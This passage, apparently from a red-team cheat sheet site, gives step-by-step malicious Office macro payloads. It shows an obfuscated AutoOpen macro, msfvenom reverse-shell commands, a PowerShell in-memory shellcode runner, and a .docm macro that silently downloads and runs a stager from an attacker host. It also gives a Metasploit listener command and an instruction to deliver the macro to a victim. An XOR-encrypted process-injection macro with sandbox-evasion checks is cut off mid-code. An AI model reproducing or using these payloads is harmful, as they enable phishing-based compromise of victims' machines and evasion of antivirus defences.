class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Nuts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;104122127068067112097131128116118132132&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token class-name">Create</span><span class="token plain"> Water</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Tea</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Coffee</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Napkin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Mymacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="powershell-stager---unencrypted"><strong>PowerShell Stager - Unencrypted</strong><a href="#powershell-stager---unencrypted" class="hash-link" aria-label="Direct link to powershell-stager---unencrypted" title="Direct link to powershell-stager---unencrypted" translate="no">​</a></h3>
<p>Keep in mind that these makes some <em>Win32 API</em> calls to avoid loading in disk and avoid AV detection. We need to things:</p>
<ol>
<li class="">The Macros stager that will download the payload, this one does not touches the disk, only memory.</li>
<li class="">The malicious powershell payload that will trigger our reverse shell.</li>
</ol>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>Create your Shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_https </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create your PowerShell script</strong>, inset here your shellcode and save the file as <code>run.ps1</code></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$Kernel32</span><span class="token plain"> = @</span><span class="token string" style="color:#e3116c">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">using System.Runtime.InteropServices;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">public class Kernel32 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token string" style="color:#e3116c">&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        uint flAllocationType, uint flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token string" style="color:#e3116c">&quot;, CharSet=CharSet.Ansi)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">            uint dwCreationFlags, IntPtr lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><span class="token string" style="color:#e3116c">&quot;, SetLastError=true)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        UInt32 dwMilliseconds);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain">@</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Add-Type</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$Kernel32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># INSERT SHELLCODE HERE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[Byte[]]</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$buf</span><span class="token plain"> = 0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x41</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0xff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$size</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[IntPtr]</span><span class="token variable" style="color:#36acaa">$addr</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token variable" style="color:#36acaa">$size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[System.Runtime.InteropServices.Marshal]</span><span class="token plain">::</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> 0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$thandle</span><span class="token plain">=</span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token variable" style="color:#36acaa">$addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$thandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">[uint32]</span><span class="token string" style="color:#e3116c">&quot;0xFFFFFFFF&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create your Macros</strong>, and save the file as a <code>.docm</code></li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">MyMacro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim str As </span><span class="token class-name">String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    str </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;powershell (New-Object System.Net.WebClient).DownloadString(&#x27;http://[ATTACKER_IP]/[stager_filename].ps1&#x27;) | IEX&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Shell</span><span class="token plain"> str</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbHide</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your HTTP Server</strong> to host the ps stager</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> http.server </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your Metasploit listener</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> msfconsole </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Deliver the Macros to the victim</strong></li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="process-injection---meterpreter-encrypted"><strong>Process Injection - Meterpreter Encrypted</strong><a href="#process-injection---meterpreter-encrypted" class="hash-link" aria-label="Direct link to process-injection---meterpreter-encrypted" title="Direct link to process-injection---meterpreter-encrypted" translate="no">​</a></h3>
<ol>
<li class=""><strong>Create your shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If you change the key, then change it in the vba code too</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> vbapplication </span><span class="token parameter variable" style="color:#36acaa">--encrypt</span><span class="token plain"> xor --encrypt-key </span><span class="token string" style="color:#e3116c">&#x27;0xfa&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create a new file Macros</strong> and insert your shellcode from step above and save the file as a <code>.docm</code>, in this case it will inject into <code>notepad.exe</code> but you can change this</li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function Sleep Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal mili </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function getmod Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> Alias </span><span class="token string" style="color:#e3116c">&quot;GetModuleHandleA&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpLibFileName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function GetPrAddr Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> Alias </span><span class="token string" style="color:#e3116c">&quot;GetProcAddress&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hModule </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpProcName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function VirtPro Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> Alias </span><span class="token string" style="color:#e3116c">&quot;VirtualProtect&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lpAddress </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flNewProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpflOldProtect </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Sub patched Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> Alias </span><span class="token string" style="color:#e3116c">&quot;RtlFillMemory&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Destination </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal Length </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal Fill </span><span class="token class-name">As</span><span class="token plain"> Byte</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function OpenProcess Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal dwDesiredAcess </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal bInheritHandle </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwProcessId </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function VirtualAllocEx Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> Integer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal fAllocType </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flProtect </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function WriteProcessMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpBaseAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef lpBuffer </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal nSize </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef lpNumberOfBytesWritten </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function CreateRemoteThread Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal ProcessHandle </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpThreadAttributes </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwStackSize </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpStartAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpParameter </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwCreationFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpThreadID </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function CloseHandle Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hObject </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Boolean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mymacro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim myTime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Timein As Date</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim second_time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Timeout As Date</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim subtime As Variant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim vOut As Integer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Is64 As Boolean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim StrFile As </span><span class="token class-name">String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    myTime </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Time</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Timein </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Date </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token return-type class-name">myTime</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Sleep </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    second_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Time</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Timeout </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Date </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token class-name">second_time</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    subtime </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">DateDiff</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;s&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Timein</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Timeout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    vOut </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CInt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">subtime</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    If subtime </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3.5</span><span class="token plain"> Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Exit Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim sc As Variant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim key As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; TODO change the </span><span class="token class-name">key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0xfa&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27;msfvenom </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p windows</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">meterpreter</span><span class="token operator" style="color:#393A34">/</span><span class="token class-name">reverse_tcp</span><span class="token plain"> LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token class-name">tun0</span><span class="token plain"> LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">f vbapplication </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt xor </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">key &#x27;</span><span 